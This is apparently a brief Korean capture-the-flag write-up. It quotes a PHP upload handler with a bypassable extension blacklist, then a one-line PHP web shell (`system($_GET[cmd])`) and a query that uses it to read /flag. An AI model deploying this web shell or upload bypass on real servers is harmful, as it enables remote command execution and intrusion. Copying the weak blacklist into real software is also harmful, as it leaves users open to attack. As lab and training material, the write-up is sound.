<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
?>

척 봐도 핵심이 되는 부분이라는 걸 알 수 있다 
php를 우회하는 것이 핵심인데 그걸 우회해서 파일을 업로드해주면 
웹쉘을 실행하는 것이 가능하다 

<?php system($_GET[cmd]); ?>  

그러면 ?cmd=/flag 이렇게 /flag를 뽑아주면 된다. 
